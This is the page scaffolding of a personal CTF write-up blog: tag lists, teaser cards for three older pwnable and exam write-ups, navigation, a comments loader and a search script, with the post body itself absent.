    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 24, 2015
  

  <i class="unloaded">2015-05-24T06:40:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey</h3>
            <div class="text-muted small">
              <p>
                





                Category: Pwnable
Points: 2

  Wibbly Wobbly Timey Wimey
Don’t blink!
wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606




32 bit ELF, with Partial RELRO, stack canary found, NX &...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/ais3-2015-pre-exam-complete-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Aug  6, 2015
  

  <i class="unloaded">2015-08-06T20:15:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>AIS3 2015 pre-exam -- complete writeup</h3>
            <div class="text-muted small">
              <p>
                





                考量到參與 AIS3 2015 pre-exam 的人幾乎都是台灣人
這個 blog 的第一篇中文 writeup 就獻給這篇了 XD
基本上就是全包這次 exam 的所有題目
有問題歡迎留言討論



MISC
MISC1
沒啥特別，範例 flag AIS3{hello_world}

MISC2
給了一個 facebook.zip，有密碼
老實說我最討厭這種需要解壓縮檔密碼的題目 = =...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/hxp-CTF-2017-hardened-flag-store/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Nov 21, 2017
  

  <i class="unloaded">2017-11-21T03:18:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>hxp CTF 2017 -- hardened_flag_store</h3>
            <div class="text-muted small">
              <p>
                





                Category: Pwnable

64 bit ELF with PIE, NX, FULL RELRO enabled



The program will read a secret string from “secret.txt” and store the string address on stack. Then it will use seccomp to create a...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/volgactf-quals-ctf-2015-my-little-pwnie/" class="btn btn-outline-primary"
    prompt="Older">
    <p>VolgaCTF 2015 Quals -- my little pwnie</p>
  </a>
  

  
  <a href="/asis-ctf-2015-quals/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>ASIS CTF 2015 Quals -- grids</p>
  </a>
  

</div>


    
      <!--
  The Disqus lazy loading.
  Powered by: <https://github.com/osvaldasvalutis/disqusLoader.js>
-->

<div id="disqus" class="pt-2 pb-2">
  <p class="text-center text-muted small pb-5">
    Comments powered by <a href="https://disqus.com/">Disqus</a>.
  </p>
</div>

<script src="/assets/js/lib/jquery.disqusloader.min.js"></script>
<script>
  const options = {
    scriptUrl: '//bruce30262logdown.disqus.com/embed.js',

    disqusConfig: function() {
      this.page.title = 'ASIS CTF 2015 Quals -- Saw this (1 & 2)';
      this.page.url = 'http://0.0.0.0:4000/asis-ctf-2015-quals-saw-this-1/';
      this.page.identifier = '/asis-ctf-2015-quals-saw-this-1/';
    }
  };

  $.disqusLoader('#disqus', options);
</script>

    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/bruce30262">Bruce Chen</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

